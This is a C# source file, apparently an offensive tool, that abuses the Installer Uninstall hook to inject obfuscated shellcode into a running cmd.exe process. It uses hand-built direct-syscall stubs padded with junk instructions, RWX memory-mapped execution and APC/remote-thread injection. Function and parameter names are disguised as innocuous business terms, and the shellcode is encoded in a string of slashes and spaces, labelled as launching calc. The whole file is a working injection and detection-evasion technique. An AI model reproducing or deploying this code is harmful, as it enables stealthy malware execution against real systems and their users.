using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;


    public class Program
    {
        public static void DllMain()
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class UninstallClass : System.Configuration.Install.Installer
    {

      public static IntPtr ProcessHandle = IntPtr.Zero;
      public static IntPtr NewThreadHandle = IntPtr.Zero;
      public static IntPtr memAddress = IntPtr.Zero;
      public static int strSize = 310;
      public static IntPtr codeSize = (IntPtr)(Int32)((strSize));
      public static ulong ptrToGS = 0;

    	public override void Uninstall(System.Collections.IDictionary savedState)
    	{
        // Get ntdll.dll base address
        GetBaseAddress( ref ptrToGS );
        // Find process to inject shellcode
        FindProcess( ref ProcessHandle, ref NewThreadHandle, "cmd.exe", "version", "" );
        // Noise is pop calc
        string Noise = "-/    /         ?  /-/ ?-/       /  ? /  /         ?  /   /   ?  /  /  ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /    / ?-/-/     ?  /   /         ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /        /       ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ?  /-/      ? /   /        ?  /     /  ?-/       /  ?-/    /         ?-/        /        ?-/   /         ?-/       /  ?-/    /     ?  /    /        ?  /     /     ?  /     /     ?  /     /     ?  /  /      ?  /    /    ?-/    /   ? /    /     ?-/       / ? /        /       ? /         /        ?-/   /        ?-/       /    ?  /     /  ?  / /     ?  / /       ? /   /   ?-/ /    ? / /         ? /     /        ?  / /      ? /       /   ? /  /         ? /    /     ?  /    /     ? /    / ?-/        /   ? /   /    ?-/-/ ? /       /    ? /        /   ? /    /     ?-/       /         ?-/ /   ?-/    /      ? /   /    ?-/-/ ? /       /    ?  /    /       ? /    /     ?-/       /         ?-/    /     ? /-/  ? /   /    ? /   /   ?-/       /     ? /     /       ? /    /       ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ?  /  /         ? /      /     ?-/   /     ?-/     /  ?  /  /      ? /       /-? /        /         ?-/  /  ?-/ /      ?  /-/ ?-/   /-?-/     /     ?-/ /     ? /-/    ?-/ /       ? /   /   ? /     /  ? /    /         ?-/  /   ? /        /         ? /     /      ? /       /-? / /         ? /    /         ?  /  /         ? /    /-?-/         /    ?  /   /-?-/      /         ?-/ /-? / /      ?  / /     ?  / /       ? /         /      ?-/  /   ? /       /         ?-/ /    ?  /     /    ? /     /     ? /     /         ?  / /      ?-/  /-?-/ /     ? /        /         ? /   /    ? /    /      ? /        /    ?-/         /  ? /     /   ?  /  /        ?-/  /  ?-/     /     ?-/   /-? /-/     ? /       /-? /     /         ?-/   /        ?-/ /   ?-/   /-? /        /         ?  /     /-?-/-/  ? /        /-?  / /    ?-/ /     ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ? /     /  ?-/-/     ? /     /-?-/     /         ? /    /   ? /   /         ?-/      / ?  /   /         ?-/     /       ? /       /       ? /       /    ? /  /  ?  /-/     ? /         /        ?  / /      ?  /  /   ? /     /      ?  /     /   ? /    /  ?-/      /       ?-/  /  ?  / /-? /        /    ?-/         /  ? /     /   ?  /  /    ?-/  /  ?-/     /     ?-/   /-?  /   /      ? /        /         ?-/         /  ?  / /   ? /    /-?-/  /       ? /        /         ? /    /  ? /     /-? /        / ?  / /    ?-/-/         ? /   /   ?  / /  ?-/     /-?-/       /-? /         /    ?  /     /   ?-/-/       ? /     /  ? /     /      ?-/   /-? / /-? /    /    ?  / / ? /      /      ? /     /-? /  /         ? /   /   ?-/-/      ? / /         ? /    /        ? /         /    ? /  /       ?-/     /         ?  /    /         ? /   /   ?-/ /   ?  /-/ ?-/    /      ?  / /-? /        /         ? /    /  ? /   / ? /    /-?  / /  ?-/   /      ?-/   /         ?  /  / ?-/-/   ?-/    /-?-/   /        ? /     /   ?-/  /   ? /    /-?  /-/       ? /   /        ?  /     /  ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ? /   /    ?-/-/       ? / /   ?  / /    ?  / /      ? /         /      ?-/         /     ? / /         ? / /      ? /        /       ? / /         ? /        /    ?-/         /    ?-/     /         ? /   /        ? /    / ?-/    /      ? /     / ?  / /    ?  /  / ? /     /  ? /  /      ?  /    /         ? /      /   ? / /     ?-/  /   ?-/-/   ?-/-/  ? /    /     ?-/       / ? /     /     ?-/   /-?  /    /  ? /    /-? /  /        ?  /  / ?-/        /         ?-/      /   ? /         / ?-/      /       ?  /-/   ?-/    /         ? /        /       ? /         /      ? /       / ? /       / ?-/     /   ?-/     /    ? /     / ?  /-/   ? / /       ?-/ /   ?-/   /        ?-/ /       ?-/      /-?-/        /       ? /      /  ?  /   /   ?  /     /  ?";

        // ZwAllocateVirtualMemory
        CoreAllocate( "a", "b", "c", ProcessHandle, ref memAddress, new IntPtr(0), ref codeSize,  0x1000 | 0x2000, 0x40 );
        GCHandle handle = GCHandle.Alloc( CoreHelper( Noise ), GCHandleType.Pinned );
        IntPtr ptrToCode = handle.AddrOfPinnedObject( );
        IntPtr byteWritten = IntPtr.Zero;
        // ZwWriteVirtualMemory
        CoreVirtual( "a", "b", "c", ProcessHandle, ref memAddress, ptrToCode, (UInt32)strSize, ref byteWritten );
        // ZwQueueApcThread
        CoreQueue( "a", "b", "c", NewThreadHandle, memAddress );
        IntPtr RemoteThread = IntPtr.Zero;
        // ZwCreateThreadEx
        CoreThreadEx( "a", "b", "c", out RemoteThread, 0, IntPtr.Zero, ProcessHandle, memAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero );
        // ZwClose
        CoreClose( "a", "b", "c", NewThreadHandle );
        // ZwClose
        CoreClose( "a", "b", "c", ProcessHandle );
    }

    // Get two bytes that represent syscall ID
    public static Int32 Resolver( string ExportName )
    {
        IntPtr ModuleBase = (IntPtr)ptrToGS;
        byte[] opcode = new byte[] { 0x0, 0x0 };
        IntPtr FunctionPtr = IntPtr.Zero;
        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        Int64 pExport = 0;
        if (Magic == 0x010b)
        {
            pExport = OptHeader + 0x60;

        }
        else
        {
            pExport = OptHeader + 0x70;

        }
        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
        for (int i = 0; i < NumberOfNames; i++)
        {
            string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
            if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
            {
                Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                opcode[0] = Marshal.ReadByte( FunctionPtr + 4);
                opcode[1] = Marshal.ReadByte( FunctionPtr + 5);
                break;
            }
        }
        return (Int32)(BitConverter.ToInt16( opcode, 0 ) + 1000 );
    }

    // Create memory mapped RWX file
    public static unsafe CODE CoreEngine<CODE>(byte[] buffer) where CODE : class
    {
        try
        {
            // https://docs.microsoft.com/en-us/dotnet/api/system.io.memorymappedfiles.memorymappedfile.createnew?view=net-5.0
            var MemMapSystemMem = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateNew(Guid.NewGuid().ToString(), buffer.Length, System.IO.MemoryMappedFiles.MemoryMappedFileAccess.ReadWriteExecute);
            var MemMapViewAccessor = MemMapSystemMem.CreateViewAccessor(0, buffer.Length, System.IO.MemoryMappedFiles.MemoryMappedFileAccess.ReadWriteExecute);
            MemMapViewAccessor.WriteArray(0, buffer, 0, buffer.Length);
            byte* String = (byte*)IntPtr.Zero; // (byte*)0;
            MemMapViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref String);
            return (CODE)(object)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer((IntPtr)String, typeof(CODE));
        }
        catch
        {
            return null;
        }
    }

    // Get ntdll.dll base address (Only 64 bit)
    public delegate ulong GetBaseAddressX( ref ulong ptrToGS );
    public static ulong GetBaseAddress( ref ulong ptrToGS )
    {
        byte[] code = {

          0x52,                                                   // push rdx
          0x51,                                                   // push rcx
          0x55,                                                   // push rbp
          0x50,                                                   // push rax
          0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,   // mov rax,QWORD PTR gs:0x60
          0x48, 0x8b, 0x40, 0x18,                                 // mov rax,QWORD PTR [rax+0x18]
          0x48, 0x8b, 0x40, 0x20,                                 // mov rax,QWORD PTR [rax+0x20]
          0x48, 0x8b, 0x00,                                       // mov rax,QWORD PTR [rax]
          0x48, 0x8b, 0x40, 0x20,                                 // mov rax,QWORD PTR [rax+0x20]
          0x48, 0x89, 0xc2,                                       // mov rdx,rax
          0x48, 0x8b, 0x4d, 0x40,                                 // mov rcx,QWORD PTR [rbp+0x40]
          0x48, 0x89, 0x11,                                       // mov QWORD PTR [rcx],rdx
          0x58,                                                   // pop rax
          0x5d,                                                   // pop rbp
          0x59,                                                   // pop rcx
          0x5a,                                                   // pop rdx
          0xc3                                                    // ret
        };
        var CoreEngine = CoreEngine<GetBaseAddressX>(code);
        return CoreEngine( ref ptrToGS );
    }



    // ZwAllocateVirtualMemory
		public delegate int CoreEngineAllocate( IntPtr BusinessMedia, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect, string ErrorCodea, string ErrorCodeb );
		public static int CoreAllocate( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect  )
    {
        var CoreEngine = CoreEngine<CoreEngineAllocate>( EngineVal( Resolver( "ZwAllocateVirtualMemory" ) ) );
        return CoreEngine( BusinessMedia, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect, "a", "b" );
    }

    // ZwWriteVirtualMemory
    public delegate int CoreEngineVirtual( IntPtr BusinessMedia, IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBusinessMediaTourAndTVLicenseNotAnd, string ErrorCodea, string ErrorCodeb );
    public static int CoreVirtual( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, ref IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBusinessMediaTourAndTVLicenseNotAnd )
    {
        var CoreEngine = CoreEngine<CoreEngineVirtual>( EngineVal( Resolver( "ZwWriteVirtualMemory" ) ) );
        return CoreEngine( BusinessMedia, BaseAddress, lpBuffer, nSize, ref lpNumberOfBusinessMediaTourAndTVLicenseNotAnd, "a", "b" );
    }

    // ZwQueueApcThread
		public delegate int CoreEngineQueue( IntPtr BusinessMedia, IntPtr BaseAddress, string ErrorCodea, string ErrorCodeb );
		public static int CoreQueue( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr BaseAddress )
    {
        var CoreEngine = CoreEngine<CoreEngineQueue>( EngineVal( Resolver( "ZwQueueApcThread" ) ) );
        return CoreEngine( BusinessMedia, BaseAddress, "a", "b" );
    }

    // ZwGetNextThread
		public delegate int CoreEngineThreadNext( IntPtr BusinessMedia, IntPtr ThreadHandle, uint /*ACCESS_MASK*/ DesiredAccess, ulong HandleAttributes, ulong BusinessShow, out IntPtr BusinessMediaShow, string ErrorCodea, string ErrorCodeb );
		public static int CoreNextT( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr ThreadHandle, uint /*ACCESS_MASK*/ DesiredAccess, ulong HandleAttributes, ulong BusinessShow, out IntPtr BusinessMediaShow  )
    {
        var CoreEngine = CoreEngine<CoreEngineThreadNext>( EngineVal( Resolver( "ZwGetNextThread" ) ) );
        return CoreEngine( BusinessMedia, ThreadHandle, DesiredAccess, HandleAttributes, BusinessShow, out BusinessMediaShow, "a", "b" );
    }

    // ZwGetNextProcess
		public delegate int CoreEngineNext( IntPtr BusinessMedia, uint /*ACCESS_MASK*/ DesiredAccess, CORE_Flags HandleAttributes, ulong BusinessShow, out IntPtr NewBusinessMedia, string ErrorCodea, string ErrorCodeb );
		public static int CoreNext( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, uint /*ACCESS_MASK*/ DesiredAccess, CORE_Flags HandleAttributes, ulong BusinessShow, out IntPtr NewBusinessMedia )
    {
        var CoreEngine = CoreEngine<CoreEngineNext>( EngineVal( Resolver( "ZwGetNextProcess" ) ) );
        return CoreEngine( BusinessMedia, DesiredAccess, HandleAttributes, BusinessShow, out NewBusinessMedia, "a", "b" );
    }

    // ZwQueryInformationProcess
    public delegate int CoreEngineQuery( IntPtr BusinessMedia, CORE_INFORMATION_CLASS ProcessInformationClass, out CORE_BASIS PBI, int ProcessInformationLength, out int BusinessShowForRunners, string ErrorCodea, string ErrorCodeb );
    public static int CoreQuery( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, CORE_INFORMATION_CLASS ProcessInformationClass, out CORE_BASIS PBI, int ProcessInformationLength, out int BusinessShowForRunners )
    {
        var CoreEngine = CoreEngine<CoreEngineQuery>( EngineVal( Resolver( "ZwQueryInformationProcess" )  ) );
        return CoreEngine( BusinessMedia, ProcessInformationClass, out PBI, ProcessInformationLength, out BusinessShowForRunners, "a", "b" );
    }

    // ZwReadVirtualMemory
    public delegate int CoreEngineRawReader( IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buf, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead );
		public static int CoreRawReader( IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buf, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead )
    {
        var CoreEngine = CoreEngine<CoreEngineRawReader>( EngineVal( Resolver( "ZwReadVirtualMemory" )  ) );
        return CoreEngine( ProcessHandle, BaseAddress, buf, NumberOfBytesToRead, ref NumberOfBytesRead );
    }

		public delegate int CoreEngineReadB( IntPtr BusinessMedia, IntPtr Buffer, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string buf, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
		public static int CoreReadB( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr Buffer, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string buf, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail )
    {
        var CoreEngine = CoreEngine<CoreEngineReadB>( EngineVal( Resolver( "ZwReadVirtualMemory" ) ) );
        return CoreEngine( BusinessMedia, Buffer, buf, BusinessShowForRunnersOnTrailAnd, BusinessShowForRunnersOnTrail, "a", "b" );
    }

		public delegate int CoreEngineReadA( IntPtr BusinessMedia, IntPtr BaseAddress, out IntPtr Buffer, UInt32 BusinessShowForRunnersOnTrailAnd, ref UInt32 BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
		public static int CoreRead( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr BaseAddress, out IntPtr Buffer, UInt32 BusinessShowForRunnersOnTrailAnd, ref UInt32 BusinessShowForRunnersOnTrail )
    {
        var CoreEngine = CoreEngine<CoreEngineReadA>( EngineVal( Resolver( "ZwReadVirtualMemory" ) ) );
        return CoreEngine( BusinessMedia, BaseAddress, out Buffer, BusinessShowForRunnersOnTrailAnd, ref BusinessShowForRunnersOnTrail, "a", "b" );
    }

    public delegate int CoreEngineRead( IntPtr BusinessMedia, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
		public static int CoreReadA( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail )
    {
        var CoreEngine = CoreEngine<CoreEngineRead>( EngineVal( Resolver( "ZwReadVirtualMemory" ) ) );
        return CoreEngine( BusinessMedia, BaseAddress, out Buffer, BusinessShowForRunnersOnTrailAnd, BusinessShowForRunnersOnTrail, "a", "b"  );
    }

    // ZwClose
		public delegate int CoreEngineClose( IntPtr BusinessMedia, string ErrorCodea, string ErrorCodeb );
		public static int CoreClose( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia )
    {
        var CoreEngine = CoreEngine<CoreEngineClose>( EngineVal( Resolver( "ZwClose" ) ) );
        return CoreEngine( BusinessMedia, "a", "b" );
    }

    // ZwCreateThreadEx
    public delegate int CoreThreadExX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, string ErrorCodea, string ErrorCodeb );
		public static int CoreThreadEx( string buffer1, string buffer2, string buffer3, out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer )
    {
        var CoreEngine = CoreEngine<CoreThreadExX>( EngineVal( Resolver( "ZwCreateThreadEx" ) ) );
        return CoreEngine( out threadHandle, 1847151+250000, objectAttributes, processHandle, lpStartAddress, lpParameter, 0, 0, 0, 0, lpBytesBuffer,  "a", "b" );
    }

    // ZwQueryVirtualMemory
    public delegate int ZwQueryVirtualMemoryX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, string ErrorCodea, string ErrorCodeb );
		public static int ZwQueryVirtualMemory( string buffer1, string buffer2, string buffer3, out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer )
    {
        var CoreEngine = CoreEngine<ZwQueryVirtualMemoryX>( EngineVal( Resolver( "ZwQueryVirtualMemory" ) ) );
        return CoreEngine( out threadHandle, 1847151+250000, objectAttributes, processHandle, lpStartAddress, lpParameter, 0, 0, 0, 0, lpBytesBuffer,  "a", "b" );
    }


    // Build syscall machine code
    public static byte [] EngineVal( Int32 opCode )
    {
          return new byte[]
          { 0x49, 0xC7, 0xC3 }.Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(1900, 2900)) ).Concat( new byte[] { 0x4D, 0x89, 0xDF } ).
          Concat( new byte[] { 0x4D, 0x39, 0xFB } ).Concat( new byte[] { 0x0f, 0x85, 0x93, 0x00, 0x00, 0x00 } ).Concat( new byte[] { 0x49, 0xff, 0xc3 } ).
          Concat( new byte[] { 0x49, 0xff, 0xc3 } ).Concat( new byte[] { 0x49, 0x83, 0xeb, 0x02 } ).
          Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(3400, 5201)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf } ).Concat( new byte[] { 0x4d, 0x39, 0xfb } ).Concat( new byte[] { 0x75, 0x7a } ).
          Concat( new byte[] { 0x49, 0x83, 0xeb, 0x03 } ).Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(1677, 1902)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf } ).Concat( new byte[] { 0x4d, 0x39, 0xfb } ).Concat( new byte[] { 0x75, 0x67 } ).Concat( new byte[] { 0x49, 0x83, 0xeb, 0x01 } ).
          Concat( new byte[] { 0x48, 0x89, 0xcb } ).Concat( new byte[] { 0xeb, 0x27 } ).Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(3910, 6602)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0x4f, 0x49, 0xff, 0xc3, 0x49, 0x89, 0xda, 0x0f, 0x05, 0x90,
          0x90, 0x90, 0x49, 0x83, 0xeb, 0x02, 0x49, 0x83, 0xeb, 0x03, 0x49, 0x83, 0xeb, 0x01, 0xc3 } ).
          Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(1930, 3466)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf } ).Concat( new byte[] { 0x4d, 0x39, 0xfb } ).Concat( new byte[] { 0x75, 0x28 } ).Concat( new byte[] { 0x49, 0xff, 0xc3 } ).
          Concat( new byte[] { 0x48, 0xc7, 0xc0 } ).Concat( (byte[])BitConverter.GetBytes((Int32)opCode ) ).Concat( new byte[] { 0x49, 0x83, 0xeb, 0x06 } ).
          Concat( new byte[] { 0x49, 0x83, 0xeb, 0x03 } ).Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(2420, 4200)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0x07, 0x49, 0x83, 0xeb, 0x08, 0x90, 0xeb, 0x3c } ).
          Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(3922, 4001)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0xf1, 0x49, 0x83, 0xeb, 0x02, 0x49, 0x83, 0xeb, 0x03,
          0x49, 0x83, 0xeb, 0x01, 0x49, 0xff, 0xc3 } ).Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(2910, 4900)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0xd3, 0x49, 0xc7, 0xc6, 0x10, 0x00, 0x00, 0x00, 0x49,
          0xc7, 0xc7, 0x12, 0x00, 0x00, 0x00, 0xc3 } ).Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(4311, 5010)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0xb5, 0x49, 0xff, 0xc3, 0x49, 0x83, 0xeb, 0x09, 0x49, 0x83,
          0xeb, 0x03, 0x49, 0x83, 0xeb, 0x02, 0x49, 0x83, 0xeb, 0x06, 0x49, 0x83, 0xeb, 0x10, 0x49, 0x83, 0xeb, 0x12 } ).
          Concat( new byte[] { 0x49, 0xc7, 0xc3 } ).Concat( (byte[])BitConverter.GetBytes((Int32)new Random().Next(1670, 1900)) ).
          Concat( new byte[] { 0x4d, 0x89, 0xdf, 0x4d, 0x39, 0xfb, 0x75, 0x8b, 0x48, 0x2d, 0xe8, 0x03, 0x00, 0x00, 0xe9, 0x22,
          0xff, 0xff, 0xff } ).ToArray();
    }

    // Find process
    public static int FindProcess( ref IntPtr ProcessHandle, ref IntPtr NewThreadHandle, string arg1, string arg2, string arg3 )
    {
        ulong Flags = 0;
        for (int i = 0; i <= 1000; i++ ) // make sure we don't loop forever
        {
            // ZwGetNextProcess
            CoreNext( "a", "b", "c", ProcessHandle, 267386880+1048576 /*0x10000000 ACCESS_MASK.GENERIC_ALL*/, CORE_Flags.None, Flags, out ProcessHandle );
            try
            {
                  CORE_BASIS PBI = new CORE_BASIS();
                  int ReturnLength = 0;
                  // ZwQueryInformationProcess
                  CoreQuery( "a", "b", "c", ProcessHandle, CORE_INFORMATION_CLASS.ProcessBasicInformation, out PBI, System.Runtime.InteropServices.Marshal.SizeOf( PBI ), out ReturnLength );
                  long PEBaddress = PBI.PebBaseAddress.ToInt64();
                  IntPtr PtrToStructure = new IntPtr();
                  UInt32 NumberOfBytesRead = 0;
                  UInt32 NumberOfBytesToRead = (UInt32)System.Runtime.InteropServices.Marshal.SizeOf( PtrToStructure );
                  // ZwReadVirtualMemory
                  CoreRead( "a", "b", "c", ProcessHandle, new IntPtr(PEBaddress + 0x20), out PtrToStructure, NumberOfBytesToRead, ref NumberOfBytesRead );
                  UNICODE_STRING UnicodeStringCommandLine = new UNICODE_STRING();
                  // ZwReadVirtualMemory
                  CoreReadA( "a", "b", "c", ProcessHandle, new IntPtr((long)PtrToStructure + 0x70), out UnicodeStringCommandLine, new IntPtr(System.Runtime.InteropServices.Marshal.SizeOf(UnicodeStringCommandLine)), IntPtr.Zero );
                  string StringCommandLine = new string('\0', UnicodeStringCommandLine.Length / 2);
                  // ZwReadVirtualMemory
                  CoreReadB( "a", "b", "c", ProcessHandle, (IntPtr)UnicodeStringCommandLine.Buffer, StringCommandLine, new IntPtr(UnicodeStringCommandLine.Length), IntPtr.Zero );
                  //Console.WriteLine(StringCommandLine);
                  StringCommandLine = StringCommandLine.ToLower();
                  if (StringCommandLine.Contains( arg1.ToLower() ) & StringCommandLine.Contains( arg2.ToLower() ) & StringCommandLine.Contains( arg3.ToLower() ))
                  {
                      // ZwGetNextThread
                      CoreNextT( "a", "b", "c", ProcessHandle, NewThreadHandle, 267386880+1048576 /*ACCESS_MASK.GENERIC_ALL*/, 0, 0, out NewThreadHandle );
                      break;
                  }
            }
            catch (Exception e)
            {
                Console.WriteLine( "status: {0}", e.Message );
            }
        }
        return 0;
    }

    // Convert Noise string to byte array
    public static byte [] CoreHelper( string timer )
    {
        byte [] pi = new byte [1];
        int upper = 0;
        string lower = "";
        int power = 0;
        int loop = 0;
        for (int i = 1; i <= timer.Length; i++) { if (timer.Substring(power, 1) == " ") { upper++; }
            else if (timer.Substring(power, 1) == "|" || timer.Substring(power,1) == "/") { if (upper > 0) { lower = lower + upper.ToString(); upper = 0; } }
            else if (timer.Substring(power, 1) == "-") { lower = lower + "0"; upper = 0; }
            else if (timer.Substring(power, 1) == "?") { if (timer.Substring(power - 1, 1) == "?" || timer.Substring(power - 1, 1) == "-")
            {
                Array.Resize(ref pi, loop + 1);
                pi[loop] = Byte.Parse( lower );
                lower = "";
                upper = 0;
                loop++;
            }
            else {
                Array.Resize(ref pi, loop + 1);
                pi[loop] = Byte.Parse( lower + upper.ToString() );
                lower = "";
                upper = 0;
                loop++;
            } }
            power++;
        }
        return pi;
    }

    [Flags]
    public enum CORE_Flags : uint
    {
       None = 0,
       INHERIT = 1
    }

  	public enum CORE_INFORMATION_CLASS : int
  	{
  			ProcessBasicInformation = 0,
  			ProcessQuotaLimits,
  			ProcessIoCounters,
  			ProcessVmCounters,
  			ProcessTimes,
  			ProcessBasePriority,
  			ProcessRaisePriority,
  			ProcessDebugPort,
  			ProcessExceptionPort,
  			ProcessAccessToken,
  			ProcessLdtInformation,
  			ProcessLdtSize,
  			ProcessDefaultHardErrorMode,
  			ProcessIoPortHandlers,
  			ProcessPooledUsageAndLimits,
  			ProcessWorkingSetWatch,
  			ProcessUserModeIOPL,
  			ProcessEnableAlignmentFaultFixup,
  			ProcessPriorityClass,
  			ProcessWx86Information,
  			ProcessHandleCount,
  			ProcessAffinityMask,
  			ProcessPriorityBoost,
  			MaxProcessInfoClass,
  			ProcessWow64Information = 26
  	};

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack=0)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct CORE_BASIS
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

}
